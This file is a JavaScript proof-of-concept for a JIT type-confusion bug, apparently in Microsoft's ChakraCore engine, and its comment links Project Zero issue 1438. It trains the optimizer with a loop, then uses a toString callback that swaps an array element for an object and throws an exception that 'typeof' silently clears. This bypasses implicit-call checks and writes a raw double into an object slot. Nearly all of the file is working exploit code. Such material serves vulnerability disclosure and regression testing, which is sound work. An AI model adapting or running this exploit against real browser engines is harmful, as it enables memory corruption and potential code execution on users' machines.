
let o = {
    toString: () => {
        throw 1;
    }
};

typeof(this[o]);

function opt(arr, index) {
    arr[0] = 1.1;
    typeof(arr[index]);
    arr[0] = 2.3023e-320;
}

function main() {
    let arr = [1.1, 2.2, 3.3];
    for (let i = 0; i < 0x10000; i++) {
        opt(arr, {});
    }

    opt(arr, {toString: () => {
        arr[0] = {};

        throw 1; // The weird handler for "typeof" catchs 
                //execptions and clears them. For example, in the 
                //following code, the exeception thrown from toString 
                //will be ignored.
                //So, we can bypass the ImplicitCallFlags checks by throwing an exception and clearing it using "typeof".
    }});

    print(arr[0]);
}

main();

//https://bugs.chromium.org/p/project-zero/issues/detail?id=1438